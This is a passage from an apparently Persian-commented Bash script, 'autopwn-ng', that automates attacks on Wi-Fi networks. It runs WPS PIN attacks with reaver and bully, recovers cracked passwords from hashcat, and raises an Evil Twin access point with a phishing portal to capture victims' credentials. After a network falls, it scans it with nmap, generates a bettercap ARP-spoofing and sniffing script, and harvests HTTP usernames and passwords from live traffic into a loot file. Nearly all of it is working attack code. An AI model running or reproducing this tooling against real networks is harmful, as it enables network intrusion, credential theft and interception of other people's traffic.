      parse_wps_csv > "$WORK/wps-cands.txt"
    fi
  else
    parse_wps_csv > "$WORK/wps-cands.txt"
  fi
  while read -r b ch; do
    grep -qF "$b" "$WORK/cracked.txt" 2>/dev/null && continue
    [ -z "$ch" ] && continue
    in_scope "$b" "" || { warn "  $b خارج از scope — رد شد."; continue; }
    # lockout check (resume-aware)
    wps_is_locked "$b"
    # ۰) NULL PIN (اولویت بالا)
    if command -v reaver >/dev/null; then
      grep -qF "$b" "$WORK/cracked.txt" 2>/dev/null || {
        timeout 20 reaver -i "$MON" -b "$b" -c "$ch" -p '' -N -vv -d 1 \
          > "$WORK/wps-null-$b.txt" 2>&1 || true
        k=$(awk -F"'" '/WPA PSK:/{print $2; exit}' "$WORK/wps-null-$b.txt")
        if [ -n "$k" ]; then
          ok "WPS (NULL PIN) → $k" && echo "$b|$k|WPS-nullpin" >> "$WORK/cracked.txt"
        fi
        wps_detect_lockout "$WORK/wps-null-$b.txt" "$b" && continue
      }
    fi
    grep -qF "$b" "$WORK/cracked.txt" 2>/dev/null && continue
    # الگوریتم‌های شناخته‌شدهٔ WPS PIN (کرک فوری) — اولویت ۲
    if command -v reaver >/dev/null; then
      for pin in $(compute_wps_pins "$b"); do
        grep -qF "$b" "$WORK/cracked.txt" 2>/dev/null && break
        timeout 20 reaver -i "$MON" -b "$b" -c "$ch" -p "$pin" \
          -N -vv -d 1 > "$WORK/wps-known-$b.txt" 2>&1
        k=$(awk -F"'" '/WPA PSK:/{print $2; exit}' "$WORK/wps-known-$b.txt")
        if [ -n "$k" ]; then
          ok "WPS (known PIN $pin) → $k" && echo "$b|$k|WPS-knownpin" >> "$WORK/cracked.txt"
          break
        fi
        wps_detect_lockout "$WORK/wps-known-$b.txt" "$b" && break
      done
    fi
    grep -qF "$b" "$WORK/cracked.txt" 2>/dev/null && continue
    # reaver Pixie Dust
    if command -v reaver >/dev/null; then
      c "  → reaver -K 1 روی $b"
      timeout 240 reaver -i "$MON" -b "$b" -c "$ch" -K 1 -N -vv -d 5 > "$WORK/wps-$b.txt" 2>&1
      k=$(awk -F"'" '/WPA PSK:/{print $2; exit}' "$WORK/wps-$b.txt")
      [ -n "$k" ] && ok "WPS (reaver) → $k" && echo "$b|$k|WPS-reaver" >> "$WORK/cracked.txt" && continue
      wps_detect_lockout "$WORK/wps-$b.txt" "$b" && continue
    fi
    # bully: brute-force PIN (alternative to reaver)
    if command -v bully >/dev/null; then
      c "  → bully روی $b"
      timeout 300 bully -b "$b" -c "$ch" -d "$WORK/bully-$b" "$MON" > "$WORK/bully-$b.txt" 2>&1
      k=$(awk -F'WPA PSK: ' 'NF>1{print $2; exit}' "$WORK/bully-$b.txt" 2>/dev/null | head -1)
      [ -n "$k" ] && ok "WPS (bully) → $k" && echo "$b|$k|WPS-bully" >> "$WORK/cracked.txt"
    fi
  done < "$WORK/wps-cands.txt"
else
  if [ "$DO_WPS" -eq 1 ]; then
    warn "reaver/bully یافت نشد — فاز ۴ (WPS) رد شد."
  fi
fi

# ---------- گزارش کرک ----------
if [ "$SKIP_TO" -le 5 ]; then
phase "استخراج نتایج"
hashcat -m 22000 "$HASH" --show --potfile-path "$POT" 2>/dev/null > "$WORK/cracked-raw.txt"
: > "$WORK/cracked.txt"
while IFS= read -r line; do
  [ -z "$line" ] && continue
  h="${line%%:*}"; pw="${line#*:}"
  bssid=$(awk -F'*' '{print $4}' <<<"$h")
  essid=$(awk -F'*' '{print $6}' <<<"$h" | xxd -r -p 2>/dev/null)
  [ -z "$essid" ] && essid="(نامشخص)"
  echo "$bssid|$pw|$essid" >> "$WORK/cracked.txt"
done < "$WORK/cracked-raw.txt"
[ -s "$WORK/enterprise-cracked.txt" ] && sed 's/^/ENTERPRISE|/' "$WORK/enterprise-cracked.txt" >> "$WORK/cracked.txt"

  save_checkpoint 5
fi

# ---------- فاز ۵: Evil Twin ----------
if [ "$SKIP_TO" -le 6 ] && [ "$DO_TWIN" -eq 1 ] && [ -n "$IFACE2" ] && ! [ -s "$WORK/cracked.txt" ] && { command -v hostapd-mana >/dev/null 2>&1 || command -v wifiphisher >/dev/null 2>&1; }; then
  phase "فاز ۵ — Evil Twin + captive portal"
  if command -v hostapd-mana >/dev/null; then
    TGT="${TARGET:-$(awk -F',' 'NR>1 && $1 ~ /^[0-9A-Fa-f:]{17}$/ {x=$1;gsub(/ /,"",x);print x; exit}' "$WORK/scan-01.csv")}"
    ESS="$TARGET_ESSID"
    [ -n "$ESS" ] || ESS=$(awk -F',' -v b="$TGT" 'NR>1 {x=$1;gsub(/ /,"",x); if(x==b){e=$14;gsub(/^ +| +$/,"",e);print e;exit}}' "$WORK/scan-01.csv")
    if [ -n "$TGT" ] && [ -n "$ESS" ]; then
      if ! in_scope "$TGT" "$ESS"; then
        warn "هدف twin ($TGT/$ESS) خارج از scope — رد شد."
      else
      {
        printf 'interface=%s\n' "$IFACE2"
        printf 'driver=nl80211\n'
        printf 'ssid=%s\n' "$ESS"
        printf 'channel=6\n'
        printf 'hw_mode=g\n'
        printf 'mana_wpe=1\n'
        printf 'mana_credout=%s\n' "$WORK/creds.txt"
        printf 'mana_eapsuccess=1\n'
        printf 'mana_macacl=0\n'
      } > "$WORK/mana.conf"
      hostapd-mana "$WORK/mana.conf" > "$WORK/mana.log" 2>&1 &
      TWIN_PID=$!
      ok "AP قلابی «$ESS» روی $IFACE2 بالا آمد. منتظر قربانی..."
      wait_bar 180 "evil twin"
      kill "$TWIN_PID" 2>/dev/null; TWIN_PID=""
      [ -s "$WORK/creds.txt" ] && ok "اعتبارنامه از twin:" && cat "$WORK/creds.txt" \
        && sed 's/^/TWIN|/' "$WORK/creds.txt" >> "$WORK/cracked.txt"
      fi
    fi
  elif command -v wifiphisher >/dev/null; then
    wifiphisher -aI "$IFACE2" -eI "$MON" -p firmware-upgrade --noextensions
  else
    warn "hostapd-mana یا wifiphisher نصب نیست."
  fi
  save_checkpoint 6
else
  if [ "$DO_TWIN" -eq 1 ] && ! [ -s "$WORK/cracked.txt" ]; then
    warn "hostapd-mana یا wifiphisher یافت نشد — فاز ۵ (Evil Twin) رد شد."
  fi
fi

# ---------- فاز ۶: Post-exploit ----------
if [ "$SKIP_TO" -le 7 ] && [ "$DO_POST" -eq 1 ] && [ "$OFFLINE" -ne 1 ] && [ -s "$WORK/cracked.txt" ] && command -v nmap >/dev/null 2>&1; then
  phase "فاز ۶ — آماده‌سازی post-exploit"
  first=$(head -1 "$WORK/cracked.txt")
  b=$(cut -d'|' -f1 <<<"$first"); p=$(cut -d'|' -f2 <<<"$first")
  # تشخیص subnet واقعی شبکهٔ کرک‌شده (best-effort)
  c "  → تشخیص subnet (via $IFACE2)"
  SUBNET=$(detect_subnet)
  if [ "$SUBNET" = "192.168.1.0/24" ]; then
    warn "subnet تشخیص داده نشد؛ پیش‌فرض $SUBNET"
  else
    ok "subnet تشخیص داده شد: $SUBNET"
  fi
  c "  → nmap اسکن شبکه ($SUBNET)"
  nmap -sn "$SUBNET" -oN "$REPORT/nmap-hosts.txt" 2>/dev/null || true
  nmap -sV -p 22,80,443,445,3389,8080 "$SUBNET" -oN "$REPORT/nmap-services.txt" 2>/dev/null || true
  ok "نتایج nmap: $REPORT/nmap-hosts.txt"
  {
    printf '#!/usr/bin/env bash\n'
    printf '# اتصال به شبکه کرک‌شده و شروع MITM\n'
    printf 'nmcli dev wifi connect %q password %q\n' "$b" "$p"
    printf 'sleep 5\n'
    printf 'sudo bettercap -iface %q -eval %q\n' "$IFACE" 'set arp.spoof.fullduplex true; arp.spoof on; net.sniff on'
  } > "$REPORT/connect.sh"
  chmod +x "$REPORT/connect.sh"
  ok "اسکریپت اتصال + bettercap: $REPORT/connect.sh"
  # استخراج پیکربندی محلی (TR-064/UPnP, SNMP, Telnet/SSH, Web, Cloud, WPS)
  if [ "${CONFIG_EXTRACT:-1}" -eq 1 ]; then
    extract_local_config "$b" "$p"
  fi
else
  if [ "$DO_POST" -eq 1 ] && [ "$OFFLINE" -ne 1 ] && [ -s "$WORK/cracked.txt" ]; then
    warn "nmap یافت نشد — فاز ۶ (post-exploit) رد شد."
  fi
fi

  save_checkpoint 7

# ---------- فاز ۷: برداشت اعتبارنامهٔ HTTP ----------
if [ "$SKIP_TO" -le 8 ] && [ "$DO_HARVEST" -eq 1 ] && [ -s "$WORK/cracked.txt" ] && command -v tshark >/dev/null 2>&1; then
  phase "فاز ۷ — برداشت اعتبارنامهٔ HTTP (passive)"
  LOOT="$REPORT/loot.tsv"
  printf 'timestamp\tsource_ip\tdest_host\tmethod\turi\tusername\tpassword\ttype\n' > "$LOOT"

  # پردازش capture موجود
  parse_pcap_creds "$CAP"

  # برداشت زنده (کوتاه) از ترافیک HTTP (فقط در حالت online)
  if [ "$OFFLINE" -ne 1 ]; then
    c "  → برداشت زنده HTTP برای ${HARVEST_TIME}s روی $MON"
    timeout "$HARVEST_TIME" tshark -i "$MON" -Y http -w "$WORK/http-live.pcapng" >/dev/null 2>&1 || true
    parse_pcap_creds "$WORK/http-live.pcapng"
  fi

  # خلاصه JSON (اختیاری)
  if command -v jq >/dev/null && [ -s "$LOOT" ]; then
    tail -n +2 "$LOOT" | jq -s -R 'split("\n") | map(select(. != "") | split("\t") | {ts:.[0], src:.[1], host:.[2], method:.[3], uri:.[4], user:.[5], pass:.[6], type:.[7]})' \
      > "$REPORT/loot.json" 2>/dev/null || true
  fi

  n_loot=$(wc -l < "$LOOT")
  if [ "$n_loot" -gt 1 ]; then
    ok "اعتبارنامه‌های HTTP ذخیره شدند: $LOOT"
    c "تعداد: $(( n_loot - 1 ))"
  else
    warn "هیچ اعتبارنامهٔ HTTP در ترافیک یافت نشد."
  fi
else
  if [ "$DO_HARVEST" -eq 1 ] && [ -s "$WORK/cracked.txt" ]; then
    warn "tshark یافت نشد — فاز ۷ (برداشت HTTP) رد شد."
  fi
fi

# ---------- گزارش ----------
if [ "$SKIP_TO" -le 8 ]; then
PMKID_N=$(grep -c '^\*\*\*\*' "$HASH" 2>/dev/null || true)
EAPOL_N=$(grep -c 'WPA\*02' "$HASH" 2>/dev/null || true)
if [ -f "$WORK/mschapv2.txt" ]; then EAP_N=$(wc -l < "$WORK/mschapv2.txt" 2>/dev/null || echo 0); else EAP_N=0; fi
PMKID_N=${PMKID_N:-0}
EAPOL_N=${EAPOL_N:-0}
EAP_N=${EAP_N:-0}
hr
{
  echo "# گزارش autopwn-ng"
  echo "تاریخ: $(date -Is)"
  echo "پروفایل: $PROFILE | مدت برداشت: ${CAPTURE}s | مونیتور: ${MON:-(offline)}"
  echo
  echo "## هش‌ها"
  echo "- PMKID: $PMKID_N"
  echo "- EAPOL: $EAPOL_N"
  echo "- Enterprise: $EAP_N"
  echo
  echo "## نتایج"
  if [ -s "$WORK/cracked.txt" ]; then
    while IFS='|' read -r a b2 c2; do
      echo "- **SSID:** $c2  \`BSSID: $a\`  →  **پسورد:** \`$b2\`"
    done < "$WORK/cracked.txt"
  else
    echo "- هیچ پسوردی بازیابی نشد."
  fi
} > "$REPORT/summary.md"

jq -R -s 'split("\n") | map(select(length>0)) | map(split("|")) |
  map({bssid: .[0], password: .[1], essid: .[2], source: (.[3] // "crack")})' \
  "$WORK/cracked.txt" > "$REPORT/summary.json" 2>/dev/null

echo
if [ -s "$WORK/cracked.txt" ]; then
  printf '\n%s╭─ %sRESULTS%s\n' "$_mag" "$_bold" "$_rst"
  printf '│ %s%-26s %s%s\n' "$_dim" "SSID" "PASSWORD" "$_rst"
  while IFS='|' read -r _rb _rp _re; do
    printf '│ %-26s %s%s%s\n' "${_re:-(hidden)}" "$_ok" "$_rp" "$_rst"
  done < "$WORK/cracked.txt"
  printf '%s╰──────────────────────────────────────────────────────%s\n' "$_dim" "$_rst"
  c "گزارش: $REPORT/summary.md"
else
  warn "کرک نشد. وردلیست بزرگ‌تر یا hashcat با GPU قوی‌تر لازم است."
fi

  save_checkpoint 8
fi
